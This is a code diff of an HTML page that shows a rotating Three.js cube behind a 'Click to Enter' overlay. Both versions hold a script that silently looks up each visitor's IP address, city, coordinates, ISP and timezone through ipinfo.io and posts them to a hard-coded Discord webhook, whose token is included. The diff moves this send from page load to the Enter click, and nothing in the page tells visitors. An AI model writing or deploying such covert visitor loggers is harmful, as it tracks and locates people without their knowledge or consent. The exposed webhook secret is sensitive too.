@@ -5,10 +5,57 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ThreeJS and Webhook</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+        }
+        #blur-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        #enter-button {
+            padding: 20px 40px;
+            background: rgba(255, 255, 255, 0.8);
+            color: #000;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
+    <div id="blur-overlay">
+        <button id="enter-button">Click to Enter</button>
+    </div>
+
     <script>
-        // Create a simple ThreeJS scene
+        // Function to gather visitor info and send to webhook
+        async function sendVisitorInfo() {
+            const webhookUrl = "https://discord.com/api/webhooks/1325077534743990284/J-NTUdd4F6Rw-oQBTmfHaPuxOnhvLiBcet-wlMGJnAn1w09B4T8SiFtp9kuESQl-tdKy";
+            const locationData = await fetch("https://ipinfo.io/json").then(res => res.json());
+            
+            const message = {
+                content: `New visitor detected:\nIP: ${locationData.ip}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.loc}\nISP: ${locationData.org}\nTimezone: ${locationData.timezone}`,
+            };
+
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(message),
+            });
+        }
+
+        // Set up ThreeJS scene
         const scene = new THREE.Scene();
         const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
         const renderer = new THREE.WebGLRenderer();
@@ -28,26 +75,13 @@
             cube.rotation.y += 0.01;
             renderer.render(scene, camera);
         }
-        animate();
 
-        // Function to gather visitor info
-        async function sendVisitorInfo() {
-            const webhookUrl = "https://discord.com/api/webhooks/1325077534743990284/J-NTUdd4F6Rw-oQBTmfHaPuxOnhvLiBcet-wlMGJnAn1w09B4T8SiFtp9kuESQl-tdKy"; // Replace with the actual webhook URL
-            const locationData = await fetch("https://ipinfo.io/json").then(res => res.json());
-            
-            const message = {
-                content: `New visitor detected:\nIP: ${locationData.ip}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.loc}\nISP: ${locationData.org}\nTimezone: ${locationData.timezone}`,
-            };
-
-            await fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(message),
-            });
-        }
-
-        // Trigger visitor info send on page load
-        sendVisitorInfo();
+        // Trigger animation after blur overlay is removed
+        document.getElementById("enter-button").addEventListener("click", () => {
+            document.getElementById("blur-overlay").style.display = "none";
+            sendVisitorInfo(); // Send visitor info after the click
+            animate();
+        });
     </script>
 </body>
 </html>
